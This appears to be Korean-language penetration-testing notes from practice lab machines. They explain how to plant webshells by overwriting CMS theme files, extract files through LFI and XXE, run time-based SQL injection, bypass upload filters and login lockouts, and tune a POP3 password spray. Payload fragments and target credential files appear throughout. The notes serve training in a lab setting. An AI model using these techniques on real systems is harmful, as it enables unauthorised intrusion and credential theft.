php -r 'var_dump(realpath("/tmp/definitely_does_not_exist_12345.php")); var_dump(realpath("/etc/hostname"));'
```
```text
bool(false)
string(13) "/etc/hostname"
```
그 `false` 가 문자열 문맥에서 `""` 로 캐스팅 → 접두사 정규식 검사 실패 → **`$tpl` 이 조용히 `home.php` 로 폴백**되고 재계산됨. 결과는 「쓰기 실패」가 아니라 **사이트 첫 화면이 웹셸로 덮이는 것**임.
→ **파일 쓰기가 「신규 생성」인지 「덮어쓰기」인지부터 확정할 것.** 신규 생성이 막힌 앱에서는 **테마에 실재하는 파일**을 명시적으로 골라 덮어써야 함.
→ **「반응이 없다」고 접기 전에 `/` 를 열어 첫 화면을 확인할 것** — 이미 심겨 있을 수 있음.
→ 어느 파일을 고를 것인가: `home.php`(첫 화면, 접근 쉽고 가장 눈에 띔) · `static.php`(정적 페이지에서만 렌더, 덜 띄고 경로 명확) · `footer.php`/`sidebar.php`(모든 페이지에 include 돼 어디서든 트리거되지만 티가 남).
⚠️ **드롭다운에 있는 값만 고를 수 있다」는 클라이언트 측 제약임.** PluXml 의 유일한 확장자 화이트리스트는 **편집기 드롭다운 목록을 만드는 용도**이고 거기에도 `.php` 가 들어 있으며, 쓰기 경로(`plxUtils::write`)에는 확장자 검사가 **아예 없음**. **선택지가 제한된 폼을 보면 값을 직접 바꿔 POST 해 볼 것.**

#### A-2-15. 파일 읽기는 통했는데 «출력이 안 보인다»

**변환기·렌더러 계열 LFI 는 결과를 화면에 안 뿌리고 «산출물 안»에 넣음.** 「출력에 안 나온다 = 실패」로 넘기면 통째로 놓침.

[[Outdated]] — mPDF 6.0 의 `<annotation file="/etc/passwd" …/>` 를 보내니 PDF 는 정상 반환되는데 화면에 `/etc/passwd` 내용이 없었음. mPDF 는 파일을 **본문에 렌더하지 않고 PDF 첨부(EmbeddedFile)로 삽입**함.

- 확인: `strings out.pdf | grep EmbeddedFile` 로 첨부 객체 존재부터
- 스트림이 `/FlateDecode` 라 **zlib 해제**가 필요(`~/PG/Outdated/extract_attach.py`, 20줄). Kali 에 `pdfdetach` 가 없어 직접 작성함
- 일반화: **컨테이너 포맷(PDF·docx·zip·이미지 메타)으로 답이 돌아오면 「파싱해서 꺼내는 단계」가 하나 더 있다**고 볼 것

**⛔ 그리고 「첨부가 아예 안 생기는 것」이 곧 권한 부족 신호임.** 같은 박스에서 `/home/svc-account/.ssh/id_rsa`·`/root/.ssh/id_rsa`·`/etc/shadow` 는 전부 `[!] no EmbeddedFile object` 로 돌아왔음 — 웹서버 프로세스 권한 밖이라 mPDF 가 못 읽은 것. **에러 메시지가 아니라 「객체 부재」로 나타나므로** 도구가 실패를 명시적으로 알려주지 않음. 여기서 방향을 권한 되는 파일(`/etc/passwd`·웹루트 소스)로 틀어 `config.php` 를 찾은 것이 진입점이 됨.

#### A-2-16. 디렉터리 리스팅에 파일명은 보이는데 내용이 안 보인다

**증상** — 디렉터리 리스팅이 켜져 있어 `config.php`·`database.php` 같은 설정 파일 «이름»이 보임. 「크리덴셜 확보」로 착각하기 쉬우나 브라우저로 받으면 빈 응답이 옴.

**원인** — `.php`·`.jsp`·`.aspx` 는 서버에서 **실행되므로** 소스가 안 나옴. 리스팅으로 노출되는 것은 이름뿐임.

**우회 세 갈래** — ① `.phps` 확장자 ② PHP 필터 LFI(`php://filter/convert.base64-encode/resource=`) ③ **SQLi 경유 `LOAD_FILE()`**. 다른 취약점이 이미 손에 있으면 그쪽이 제일 빠름.

[[Pebbles]] — `/zm/includes/` 에 파일명이 노출됐고 `curl` 로는 빈 응답. SQLi 가 이미 있었으므로 `LOAD_FILE` 로 디스크에서 직접 읽어 `zmuser:zmpass` 를 얻음(출처: `~/PG/Pebbles/dbphp.out`).

**역방향 반사** — 리스팅에서 `.bak`·`.txt`·`.old`·`~` 로 끝나는 파일이 보이면 그건 **그대로 소스가 나옴.** 리스팅을 만나면 이 확장자부터 노릴 것.

#### A-2-17. SQLi 는 찾았는데 데이터가 안 나온다

**증상** — 주입은 되는 것 같은데 UNION·에러 기반이 전부 무소득. 「SQLi 가 아니었나」로 되돌아가면 시간을 크게 버림.

**분리해서 생각할 것 — ① 주입 성립 확인(참/거짓 신호가 하나라도 있는가) ② 추출 채널 선택.** 취약점이 있어도 채널이 안 맞으면 아무것도 안 나옴. 둘은 다른 판단임.

[[Pebbles]] — `limit` 이 `LIMIT` 절 **뒤**라 이미 완성된 SELECT 의 꼬리였음. 정석대로 UNION 부터 시도:
```text
limit=1 UNION SELECT 1               # LIMIT 1 UNION ... → 문맥 충돌
limit=1 UNION SELECT 1,2,3,4,5,6,7   # 컬럼 수 브루트포스 — 응답 변화 없음
```
컬럼 수를 맞춰도 응답 본문이 안 바뀌어 결과를 눈으로 확인할 수 없었고, 에러 기반(`AND extractvalue(1,concat(0x7e,version()))`)도 에러가 렌더되지 않아 무소득. **`;SELECT SLEEP(5)#` 한 방으로 스택 쿼리가 확인되자 나머지는 스크립트가 처리함.** 응답이 안 변하는 순간 채널을 갈아탈 것.

⚠️ 위 두 UNION 시도의 응답 산출물은 남지 않았음(`[가정]`). 확정된 것은 최종 채널이 time-based 였다는 것까지임.

**채널 우선순위** — **UNION → 에러 → Boolean → time.** time 은 요청마다 실제로 기다려야 해서 가장 느림. 다만 **스택 쿼리가 열리면 순위가 뒤집힘** — 독립한 `SELECT SLEEP()` 을 붙일 수 있어 time 이 오히려 가장 깨끗해짐([[Pebbles]] 가 그 경우).

#### A-2-18. 유명 CMS 가 봉쇄돼 있고 정체불명 서비스가 함께 떠 있다

**인증 표면이 없으면 버전이 아무리 낮아도 넘어갈 것.** 인증 후 취약점을 찾아내도 못 씀.

[[Muddy]] — WordPress 5.7 + 구형 플러그인(kali-forms 2.3.0)이 시각적으로 유혹적이나 `wp-login.php` 가 **302 로 `/404` 리다이렉트**되고 `wp-json` 도 **401** 이었음. 진짜 진입점은 8888 의 정체불명 프레임워크(Ladon)였음.

**판정 순서 — ①에서 막히면 그 자리에서 접을 것:**
1. 인증 없이 닿는 엔드포인트가 있는가 — `curl -I http://<타겟>/wp-login.php` 한 줄
2. 그 엔드포인트가 입력을 받는가
3. 그 입력이 위험한 싱크에 닿는가

**일반 규칙** — 랩 설계자가 유명 CMS 를 진짜 진입점으로 뒀다면 **정상 로그인 폼을 열어뒀을 것**임. 봉쇄된 CMS 옆에 정체불명 서비스가 함께 떠 있다는 것 자체가 의도의 표시임(A-17 의 「버전 있는 유명 앱부터」와 반대 방향의 짝 — 그 앱에 **닿을 수 있을 때만** 성립).

#### A-2-19. 파라미터가 아무 데도 없다 — 「어느 취약점 부류인가」가 아니라 「입력이 어떤 형식으로 들어가는가」부터

**「파라미터가 없다」는 막다른 길이 아니라 「입력 형식이 다르다」는 신호임.**

[[Muddy]] — 기존 노트가 이 박스를 **LFI** 로 분류했으나 랩 브리핑은 **XXE** 였음. `?page=`·`?file=`·`?include=` 가 80/8888 어디에도 없어 계속 찾은 것이 가장 나쁜 시간 소모였음. 전환점은 「입력이 어떤 형식으로 들어가는가」 재검토 — `uid` 는 쿼리스트링이 아니라 **SOAP XML 바디**로 전달됐음.

**자가 판정 절차:**
1. 사용자 입력이 서버에 도달하는 **모든** 경로를 나열 — 쿼리스트링·폼 바디·헤더·쿠키·XML/JSON 바디·업로드 파일명·업로드 파일 내용
2. 각 입력이 **어떤 형식으로 파싱되는가** 확인
3. 형식이 정해지면 후보가 자동 축소됨:

| 입력 형식 | 후보 |
|---|---|
| 문자열 | LFI · SQLi · 커맨드 인젝션 · SSTI |
| XML | **XXE** · XPath 인젝션 · XML 폭탄 |
| JSON | 프로토타입 오염 · 타입 혼동 |
| YAML | 역직렬화 RCE |
| 직렬화 객체 | 역직렬화 RCE |

⚠️ **기존 분류(자기 노트 포함)를 근거로 쓰지 말 것** — 그것이 이 박스에서 통째로 틀렸음.

#### A-2-20. 같은 익스플로잇에서 «일부 입력만» 실패한다 — 실패한 입력의 특성을 봐라

**증상** — `/etc/passwd` 는 잘 읽혔는데 특정 파일만 실패해 「방금 그건 우연이었나」로 익스플로잇 자체를 의심하게 됨.

[[Muddy]] — `apache2.conf`(`AuthUserFile` 확인 목적)를 XXE 로 읽으려니 이 traceback 이 돌아옴:
```text
UnboundLocalError: local variable 'req_dict' referenced before assignment
```
원인은 파일 안의 `<` 가 재파싱 시 XML 문법을 깨뜨리는 **파싱 붕괴**였고, **그 traceback 자체가 취약함의 방증**임(XXE 가 안 통했다면 애초에 이 traceback 도 안 남).

**확인법 — 30초면 판정됨:** 실패한 파일을 `head -1` 만 읽어보거나, `<` 가 확실히 없는 다른 파일(`/etc/hostname`)을 하나 더 읽어 익스플로잇이 살아 있음을 재확인할 것.

| 읽힘 | 안 읽힘 |
|---|---|
| `/etc/passwd` · `/etc/shadow` · `/etc/hosts` | `*.conf`(Apache/nginx — `<Directory>` 등) |
| `.htpasswd` · `passwd.dav` | `*.php`(`<?php`) |
| `/etc/crontab` · `/proc/self/environ` | `*.xml` · `*.html` |
| SSH 개인키(`-----BEGIN`) | 부등호가 든 스크립트(`if [ $a < $b ]`) |

**우회 둘** — ①OOB DTD(파라미터 엔티티 `%` 로 공격자 서버 DTD 를 불러 내용을 URL 에 실어 보냄) ②`php://filter` base64 래핑(PHP 애플리케이션 한정 — Python 인 Ladon 에는 못 씀).

⛔ **과잉 대응 금지.** 목표 파일이 평문이면(`<` 없음) 인밴드로 충분함 — OOB DTD 세팅에 최소 10분(웹서버 기동·DTD 작성·아웃바운드 확인)이 듦. **「고급 기법을 안다」와 「지금 필요하다」는 다름.** 판단 순서: ①목표 파일 확정 → ②`<` 가 있을 법한가 → ③없으면 인밴드.

#### A-2-21. 웹셸은 올렸는데(201) 실행이 401 — 업로드 실패로 오인하기 쉽다

**증상** — `curl -T` 로 `201 Created` 를 받았는데 브라우저로 그 파일을 열면 401. 「업로드가 실제로는 실패했나」·「확장자가 막혔나」·「WebDAV 가 PUT 을 흉내만 냈나」 같은 **잘못된 가설**로 빠지기 쉬움.

[[Muddy]] — `/webdav/` 는 `GET` 에도 Basic auth 를 요구했음. `--user` 를 붙이니 즉시 `uid=33(www-data)`.

**일반화 — 인증 영역 «안»에 파일을 올렸으면 그 파일도 인증 영역 안임.** 업로드(`201 Created`)와 실행은 **별개 요청**이라 둘 다 인증을 붙일 것.

| 코드 | 의미 | 다음 행동 |
|---|---|---|
| 401 | 인증이 필요함 | 자격증명을 붙임. **파일 존재 여부와 무관** |
| 403 | 인증됐거나 인증 불필요인데 정책이 막음 | 다른 경로·다른 메서드. `.ht*` 차단 같은 정적 규칙 의심 |
| 404 | 없음 | 경로 추측을 다시 |
| 500 | 코드가 실행되다 죽음 | **가장 값진 응답** — 입력이 싱크에 도달했다는 뜻 |

[[Muddy]] 는 401·403·500 을 전부 만나 셋을 다른 의미로 썼음 — 500(traceback)은 버전 판정(A-13), 403(`.htpasswd`)은 「HTTP 로는 못 얻는다」의 확정, 401 은 「인증 붙여라」.

**401 을 배제한 다음 단계 — PUT 은 되는데 업로드한 PHP 가 실행이 안 될 때:**
1. **확장자 필터** → `.phtml` · `.php5` · `.php7` · `.phar` 로 우회
2. **업로드 디렉터리에서 PHP 엔진이 꺼져 있음**(`php_admin_flag engine off` · `/uploads/.htaccess`) → WebDAV `MOVE` 로 다른 디렉터리에 옮겨 시도
3. **PHP 핸들러 미적용** → 200 이 오는데 **소스가 그대로 보임.** 그것이 증상임

⛔ **여기서 포기하지 말고 「그 파일을 include 해 줄 지점」을 찾을 것.** 업로드와 실행이 분리된 박스의 정답은 항상 LFI·역직렬화 쪽임([[Zipper]] 가 그 경우 — B-1-30). [[Muddy]] 는 셋 다 안 걸리고 바로 실행됐음.

#### A-2-22. 같은 기능의 엔드포인트가 여럿이다 — «파싱 방식»으로 나눠 우선순위를 매긴다

**같은 백엔드 메서드를 부르더라도 입력 파서가 다르면 취약점도 다름.**

[[Muddy]] — Ladon 카탈로그가 인터페이스를 6종 노출했으나 전부 동등하지 않았음(전부 `checkout` 을 부름):

| 엔드포인트 | 파서 | 등급 |
|---|---|---|
| `/muddy/soap11` · `/muddy/soap` · `/muddy/soapdocumentliteral` | `xml.sax.make_parser()` | 최우선 |
| `/muddy/xmlrpc` | `minidom.parseString()` | 차선 |
| `/muddy/jsonwsp` · `/muddy/jsonrpc10` | JSON | 해당 없음 |

→ **프레임워크가 여러 인터페이스를 노출하면 전부 열거하고 «가장 XML 스러운 것»부터 때릴 것.** 하나가 막혀도 다른 하나가 열려 있는 경우가 흔함. A-2-19 에서 입력 «형식»을 정했으면 그다음이 「어느 문을 때릴지」임.


**정보원이 갈리면 「누가 맞나」가 아니라 「역할이 다른가」를 먼저 물을 것.** [[Algernon]] — 사전 정보는 9998 을, 개인 노트는 17001 을 지목했고 **둘 다 열려 있어 어느 쪽도 배제 불가**였음. 해소는 프로토콜 질문 셋으로 함:

| 질문 | 9998 | 17001 |
|---|---|---|
| `-sV` 판정은? | `http Microsoft HTTPAPI httpd 2.0` | `remoting MS .NET Remoting services` |
| 익스플로잇이 보내는 것은? | — | `.NET` 매직으로 시작하는 원시 TCP |
| HTTP 로 말을 거는가? | 예(`/interface/root` 리다이렉트) | 아니오 |

「둘 다 맞다」가 정답이었음 — 하나의 제품이 웹 UI·API·관리 RPC·클러스터링·메트릭을 서로 다른 포트로 여는 것은 매우 흔함.
→ **익스플로잇 코드의 «기본값»은 그 자체로 정찰 정보임.** EDB 49216 이 `PORT=17001` 을 기본값으로 갖고 있다는 사실이 결정적 단서였고, 원본을 읽지 않고 IP 만 바꿔 쏘는 습관이었으면 놓쳤을 것임(A-14).
→ 사전 정보가 9998 을 지목한 이유는 Metasploit 모듈이 `RPORT` 기본값을 9998, `TCP_PORT` 를 17001 로 **나눠 두었기 때문으로 보임** `[가정]`.
→ **제품은 있는데 표준 포트가 닫혀 있으면 비표준 관리·RPC 채널이 표적임.** 이 박스는 메일 서버인데 25·110·143·587 이 전부 closed 였고, 실제 입구가 관리 채널(17001)이었음.

#### A-2-23. 해시 문자는 반드시 `%23` — URL 프래그먼트가 서버에 안 간다

**증상** — `zip://<파일>#<엔트리>` 처럼 `#` 를 포함한 값을 파라미터에 실어 보내면 200 이 오는데도 **아무 일도 안 일어남.**

**원인** — `#` 는 URL 프래그먼트 구분자임. 브라우저 주소창·`curl` 의 URL 인자·Burp Repeater 의 URL 바가 **`#` 뒤를 전부 잘라** 서버에 안 보냄. 서버는 `#` 앞부분만 받고 실패함.

**해법** — 반드시 `%23` 으로 인코딩. `curl` 은 `-G --data-urlencode` 에 인코딩을 위임하면 실수 여지가 없음.
**진단** — 실제 «도착한» 쿼리스트링을 서버 로그나 Burp 에서 확인하면 `#` 유실이 바로 보임.

[[Zipper]] — `zip://uploads/upload_<time>.zip%23shell`. 원 노트 표현이 「이 한 글자가 이 박스의 진짜 관문이다」임. **`zip://` 가 무반응일 때 압도적 1위 원인이 이것임**(B-1-30).

**같은 성질의 «공격» 활용 — 경로에 `%23` 을 끼우면 라우팅·파싱이 깨져 500 이 나는 앱이 있음.** [[Astronaut]] 은 `http://TARGET/grav-admin/%23.txt` 한 번으로 **218KB 짜리 Whoops 디버그 페이지**를 받았고 거기서 웹루트 절대경로와 스택 프레임 16종이 나왔음(상세는 B-1-41). 같은 계열의 경로 삽입 후보 — `%00` · `%2e%2e%2f` · 배열 파라미터(`a[]=1`) · 초장문 값.

#### A-2-24. 로그인 잠금이 «클라이언트 쿠키»에만 있으면 그것은 잠금이 아니다 — 그리고 손으로 하는 나를 잡는다

**증상** — 수동 테스트에서 쿠키 단지를 재사용(`curl -c ck.txt -b ck.txt`)했더니 **자기 자신을 잠갔음.** 정답을 이미 때렸는데 밴 화면을 받고 있음.

[[Monster]] 실측 — 7개 조합을 한 쿠키 단지로 돌렸고, 실패마다 `login_attempts` 가 1씩 올라 6번째부터 5에 도달, 그때부터 서버가 비밀번호를 **아예 검사하지 않고** "You are banned for 10 minutes" 를 돌려줬음. **7번째가 정답이었음.**

**증거는 화면에 있었음** — 앞의 다섯은 `8507`, 뒤의 둘만 `8513`. **6바이트 차이.** 그걸 보고도 「플래시 메시지가 쌓였겠지」로 넘김.

⛔ **더 나쁜 것은 그다음이었음** — 곧바로 **쿠키 없이** 두 응답을 다시 받아 `diff` 를 떠서 「차이 없음」을 확인하고 오판을 확정지음. 쿠키가 없으니 밴이 안 걸린 게 당연했음. **재현 조건(쿠키 유무)을 바꿔서 뜬 diff 는 원래 관측을 반증하지 못함**(A-61).

**교훈 둘**
- **로그인 시도를 반복할 때 쿠키 단지를 공유하지 말 것.** 시도마다 `-c` 를 새 파일로 하거나 아예 쿠키 옵션을 뺄 것
- **응답 크기 차이는 반드시 본문을 열어볼 것.** 「왜 다른지」를 설명하지 못하면 넘어가면 안 됨

**파생 — 쿠키에 잠금이 있으면 hydra 가 오히려 안전함.** 쿠키를 안 보내는 도구는 이 잠금을 아예 못 받음. [[Monster]] 에서 hydra 가 통한 이유가 그것이고, **소스를 읽고서야 알았음.** 서버 카운터형 잠금은 A-2-12(그쪽은 되돌릴 수 없는 사고임).

#### A-2-25. 소스가 손에 있는데 «두드리기»부터 했다 — 「들어갈 수 있나」보다 「들어가면 뭘 할 수 있나」

**진입점 후보(가입 폼·게스트 등록·초대)를 시도하기 «전에» 「성공하면 뭘 할 수 있는가」부터 소스로 확인할 것.**

[[Monster]] 실측(15분 손실, **애초에 갈 수 없는 길**) — `/blog/users/registration` 이 열려 있어 가입 → 권한상승을 노렸고 cryptographp 캡차를 뚫으려 이미지 픽셀을 셌음:
```text
cap.png: PNG image data, 130 x 40, 8-bit/color RGB, non-interlaced
[((255,255,255),4781), ((191,191,191),336), ((128,2,0),43), ((9,96,8),31), …]
```
흰 배경 + 회색 점 + 빨간 선 + 초록 호 — **글자 픽셀이 아예 없음.** `cryptographp.inc.php` 가 `imagettftext()` 로 TTF 를 그리는데 폰트 로드가 실패하면 아무것도 안 그려지고 잡음만 남음. 읽을 방법이 없었음. `answer=` 를 비운 우회도 `if ($_SESSION['cryptcode'] and (…))` 의 첫 조건에서 false 라 실패.

**그런데 이 15분이 통째로 무의미했음** — 가입 처리가 `'role' => 'user'` 를 **하드코딩**하고 프로필 수정(`getProfileEdit`)이 업데이트하는 필드는 `login/firstname/lastname/email/skype/about_me/twitter` 뿐이라 **role 은 매스어사인먼트가 안 됨.** 관리 플러그인도 `in_array(Session::get('user_role'), array('admin','editor'))` 로 걸림. **캡차를 뚫어도 얻는 것이 없는 경로였음.**

→ **소스가 손에 있는 정황(B-1-21)이면 엔드포인트를 두드리기 전에 그 엔드포인트로 뭘 할 수 있는지부터 읽을 것.** 이미지 픽셀부터 세기 시작한 것이 실패의 본체임.

#### A-2-26. 업로드가 죽어 있다 — 「확장자 필터인가 기능 자체인가」부터 계층을 나눌 것

**증상** — 블랙리스트에 없는 확장자를 찾아냈는데도 업로드가 안 됨. 반사적으로 `.pht`·`.phar`·이중확장자·널바이트로 넘어가면 한참 헤맴.

[[Monster]] — Monstra filesmanager 의 금지 확장자 목록에 `php7`·`pht`·`phar` 가 **없는 것은 소스로 확인했고 사실**이었음(블랙리스트가 `php5` 까지만 세고 멈춘 전형). 그런데 **업로드 기능 자체가 죽어 있어** EDB-48479·EDB-49949 가 둘 다 무용지물이었음. `.txt`·`.jpg` 로도 "File was not uploaded" 가 떨어지는 것을 확인해 **「확장자 필터가 아니라 업로드 기능」으로 계층을 분리한 것이 방향 전환에 결정적**이었음.
⚠️ 「XAMPP 의 `httpd-xampp.conf` 가 `.php7` 도 PHP 핸들러에 물린다」는 이 박스에서 **확인되지 않았음**(업로드가 죽어 시도 자체가 불가). 재사용 시 먼저 확인할 것.

→ **일반화: CMS 관리자 패널을 잡으면 업로드만 보지 말 것.** PHP 를 디스크에 쓰는 경로는 보통 여러 개임 — **테마/템플릿/스니펫 에디터 · 플러그인 설치 · 백업 복원.** [[Monster]] 의 RCE 도 업로드가 아니라 그쪽에서 나왔음.

#### A-2-27. 「확인 후 폐기한 벡터」를 표로 남길 것 — 배제 목록이 다음 사람의 지도다

[[Monster]] 실측(전부 확인 후 폐기):

| 시도 | 결과 |
|---|---|
| SMB null / guest 세션 | `NT_STATUS_ACCESS_DENIED` / `NT_STATUS_ACCOUNT_DISABLED`. `rpcclient -U '' -N` 도 `Cannot connect`, `enum4linux-ng` 도 세션 실패 |
| `/blog/storage/database/users.table.xml` 직접 읽기 | 403. Monstra 가 `storage/.htaccess` 에 `Deny from all` 을 넣어 **출하함** |
| 경로 우회 (`//` · `/./` · 대소문자) | 전부 403 |
| 로그인·비밀번호재설정의 XPath 인젝션 | 직후 동등검사가 막음(B-16) |
| XAMPP `/php-cgi/php-cgi.exe` (CVE-2024-4577) | 엔드포인트는 **있음** — `/php-cgi/php.exe` 는 403 인데 `php-cgi.exe` 만 500(XAMPP 의 `<Files "php-cgi.exe">Require all granted` 구성 그대로). 그러나 `%ADd …`·`-d …` 둘 다 500 에서 안 움직였음. 이 취약점의 best-fit 문자 매핑은 **CJK 코드페이지에서만 성립한다고 알려져 있고** 이 박스는 영문 로케일로 보임 — **`[가정]`, 코드페이지를 직접 확인하지 못했음** |
| 웹 이미지 exif / strings | 전부 무소득 |
| UDP top-100 | 열린 포트 없음 |

→ **「어떻게 배제했는지」가 다음 사람에게 남는 것임.** 빈손 표가 곧 「이 박스의 답은 이것들이 아니다」라는 정보임. ⚠️ 단 **「배제했다」와 「끝까지 못 해봤다」를 섞지 말 것**(A-19 · D 절) — [[Monster]] 의 쓰기 가능한 `httpd.exe`·`mysqld.exe` 는 배제가 아니라 **미완**이고, 그 트리거를 찾는 도중에 박스가 내려갔음(A-68).

**⚠️ 정답 경로가 먼저 성공해 «불필요해진» 갈래는 미완이지 배제가 아님.** 표에 섞어 적으면 다음 사람이 닫힌 문으로 오독함. [[Butch]] 의 미탐색 갈래 — 막혔을 때의 다음 후보 목록으로 남김:

| 갈래 | 상태 | 만약 SQLi 가 막혔다면 |
|---|---|---|
| FTP(21) 익명 로그인 + 웹루트 겹침 | 결과 기록 없음 | IIS FTP 가 웹루트를 가리키면 FTP 업로드만으로 웹셸이 됨. 매우 흔한 구성 |
| SMTP(25) `VRFY` 사용자 열거 | 결과 기록 없음 | 사용자명 목록 → 웹 로그인 브루트포스 재료 |
| MSSQL `xp_cmdshell` | 시도 기록 없음 | 스택 쿼리가 성립했으므로 DB 계정이 sysadmin 이면 **즉시 RCE.** 업로드 단계를 건너뜀(B-1-43) |

**[가정]** 위 갈래들은 SQLi 가 먼저 성공해 불필요해졌을 뿐 실패해서 버린 것이 아님.

**Windows 단독 호스트에서 SMB/RPC 를 «근거를 대고» 버린 사례** — [[Squid]]. 외부에 135·139·445·49666·49667 이 열려 있어 반사적으로 SMB 부터 파게 되는 배치였음:

| 신호 | 읽는 법 | 결론 |
|---|---|---|
| `Message signing enabled but not required` | NTLM 릴레이가 이론상 가능 | 릴레이는 **인증을 흘려보낼 다른 호스트**가 있어야 성립. 단독 호스트 랩에서는 쓸 곳이 없음 → **배제** |
| 445 open · 자격증명 없음 | 익명 세션(`-N`)으로 공유·사용자 열거 | Server 2019 는 익명 열거 기본 차단. `[가정]` **실측 기록 없음 → 미시도** |
| 49666 · 49667 | RPC 엔드포인트 매퍼가 넘겨준 고번호 포트 | 135 가 열리면 항상 따라붙는 부산물. 그 자체는 단서가 아님 |

**판정 기준은 하나 — 「지금 내가 가진 것으로 이 포트를 진전시킬 수 있는가」.** 자격증명 없음 + SMB 는 익명 열거가 열린 구버전이 아니면 거의 항상 막다른 길임(15분 안에 접을 것, D 절). 반면 프록시·웹은 자격증명 없이도 진전 가능한 표면이라 우선순위가 훨씬 높음.

**성공 경로가 먼저 나와 «안 판» 갈래 — 배제가 아니라 미완임.** [[Pelican]]:

| 발견 | 신호 | 확인했어야 할 것 (미완) |
|---|---|---|
| ZooKeeper JMX(39605) — `jmxremote.local.only=false` | 인증·SSL 여부가 명령줄에 명시 안 됨 | `--script rmi-dumpregistry` → MLet 기반 원격 MBean 로드로 RCE 가능성. Exhibitor 경로가 이미 셸을 줘서 안 감 |
| CUPS 2.2.10(631) | `Potentially risky methods: PUT` + 웹 관리 UI | `curl -i -X OPTIONS` · `/admin` 접근 · 프린터 추가 권한 |
| Samba 게스트(139/445) | `smb-security-mode: account_used: guest` — nmap 이 게스트 인증에 **성공**했다는 뜻 | `smbclient -L //IP/ -N` · `smbmap -H IP -u guest`. **30초짜리 확인을 안 한 것 자체가 실수** |

→ 같은 박스에서 **진짜 배제**였던 것 하나 — root 소유 `chown -R` 루프(PID 487). GNU `chown -R` 은 `-L`/`-H` 없이는 심볼릭 링크를 안 따라가고(`-P` 가 기본) 소유권도 비특권 계정으로만 바뀜.
⚠️ **표에 섞어 적으면 다음 사람이 닫힌 문으로 오독함** — 위 두 표를 굳이 나눠 놓은 이유가 그것임.

#### A-2-28. 인증 스프레이가 N번째 계정에서 타임아웃으로 죽는다 — 차단이 아니라 «사전 지연»이다

**증상** — 앞 두 계정은 응답이 오는데 세 번째에서 소켓 타임아웃. 「방화벽이 나를 차단했다」로 결론 내리면 시간을 태움.

[[Fowsniff]] 실측 — POP3 스프레이 1차 시도가 3번째 계정(`tegel`)에서 8초 타임아웃으로 죽음:
```text
mauer      mailcall     -> -ERR [AUTH] Authentication failed.
mustikka   bilbo101     -> -ERR [AUTH] Authentication failed.
Traceback (most recent call last):
  File "/home/kali/PG/Fowsniff/pop3spray.py", line 13, in <module>
    s.sendall(f'PASS {p}\r\n'.encode()); r2=rd(s)
                                            ~~^^^
  File "/home/kali/PG/Fowsniff/pop3spray.py", line 6, in rd
    while not d.endswith(b'\r\n'): d+=s.recv(4096)
                                      ~~~~~~^^^^^^
TimeoutError: timed out
```
— 출처: `~/PG/Fowsniff/try1_pop3spray.log`

**실제 원인** — Dovecot 이 같은 IP 의 인증 실패를 세면서 **다음 인증을 시작하기도 전에** 대기를 검. Dovecot 소스로 확인한 수치(`[가정]` Ubuntu 16.04 기본 패키지인 **2.2.22** 전제 — nmap 은 `Dovecot pop3d` 까지만 뱉었고 이 박스의 실제 버전은 관측되지 않았음):
- 실패할 때마다 penalty 가 1 오름 — `auth-request-handler.c` 의 `auth_penalty_update(auth_penalty, request, request->last_penalty + 1)`
- 다음 연결의 **사전 지연** = `auth_penalty_to_secs(penalty)` = `2` 를 penalty 번 두 배, 상한 15초(`auth-penalty.c`). penalty 0 이면 지연 없음, 1 → 4초, 2 → 8초, 3 이상 → 15초
- 여기에 실패 응답 자체의 지연 `auth_failure_delay` 가 더해짐. `auth-settings.c` 의 기본값은 `.failure_delay = 2`(2초)
- penalty 는 IP 별로 anvil 이 들고 있고 `AUTH_PENALTY_TIMEOUT` = 2+4+8+15 = **29초** 동안 유지됨(`auth-penalty.h`)

관측과 맞추면 1번째 ≈ 2초, 2번째 ≈ 4+2 = 6초, 3번째 ≈ 8+2 = 10초. **8초 타임아웃이 정확히 세 번째에서 터지는 것이 맞음.**

**고친 것 중 실제로 효과가 있었던 것은 타임아웃 40초 하나뿐임.** 지연 상한이 15+2 = 17초라 40초 안에 들어옴. 같이 넣은 `time.sleep(3)` 은 penalty 만료가 29초라 아무것도 리셋하지 못함 — 심리적 안전장치였을 뿐임. 정말 penalty 를 털려면 계정 사이에 **30초 이상** 쉬어야 함.

**구분법** — 차단이면 TCP 연결 자체가 안 되거나 RST 가 옴. 여기선 **연결은 되고 응답만 늦었음.** 그럼 애플리케이션 레이어의 의도된 지연임(A-24 · A-12).

→ **인증 스프레이는 타임아웃을 넉넉히 잡을 것.** 짧으면 지연·락아웃·방화벽 중 무엇에 걸렸는지 구분이 안 됨. 그리고 「간격을 두면 괜찮겠지」는 **그 서비스의 만료 시간을 확인하지 않으면 근거 없는 위안임.**
→ **안 풀린 계정은 스프레이에서 빼둘 것.** 실패 카운트가 하나 더 쌓이면 뒤 계정의 사전 지연이 커짐([[Fowsniff]] 의 `if p.startswith('<'): continue`).
⚠️ 계정 «잠금»이 걸리는 부류는 A-2-12 — 그쪽은 늦추는 것이 아니라 계정을 죽임. **지연인지 잠금인지를 먼저 가를 것.**

#### A-2-29. 앱 전체가 로그인 뒤에 있어 보인다 — 인증 예외 목록부터 노린다

**전 페이지가 302 `/login` 으로 튕겨도 «예외 화이트리스트»는 거의 항상 존재함.** 로그인 폼이 멀쩡히 있다는 것이 전부 막혀 있다는 뜻이 아님 — **인증 없이 닿는 엔드포인트 하나가 전체 인증을 무의미하게 만듦.**

**후보 목록 — 배치로 프로빙할 것(D 절):**
- 헬스체크·메트릭 — `/health` · `/metrics` · `/actuator/*`
- 콜백·웹훅 — `/callback` · `/webhook/*` · `/notify`
- 정적 자원 핸들러 — `/static/*`(경로 트래버설로 이어짐)
- **연동 프로토콜 수신구** — `/flash/*`(Click'n'Load) · `/xmlrpc.php` · `/jsonrpc`
- API 버전 프리픽스 — `/api/v1/*` 는 인증하는데 `/api/v2/*` 가 빠져 있는 경우

[[pyLoader]] 가 이 부류임 — pyLoad 웹UI 는 세션이 없으면 전 페이지를 302 시키는데 `/flash/addcrypted2` 만 `login_required` 대신 `@local_check`(출발지 IP 검사)가 붙어 있었고, 그 검사조차 **앱 자신의 프록시가 무력화**했음(B-15).

**그 엔드포인트에 도달했는데 응답이 이상하면 증상별로 나눌 것:**

| 증상 | 원인 후보 | 확인 / 대응 |
|---|---|---|
| POST 는 200 인데 셸이 안 붙는다 | `&` 를 인코딩 안 해서 파라미터가 잘림 | `>&` → `%3E%26` 확인. 본문 전체를 작은따옴표로 감쌌는지 확인(B-81) |
| `403 Forbidden` | 출발지 IP 검사에 걸림 | **`Host:` 헤더 위조**로 `or` 의 두 번째 가지를 노림(B-15) |
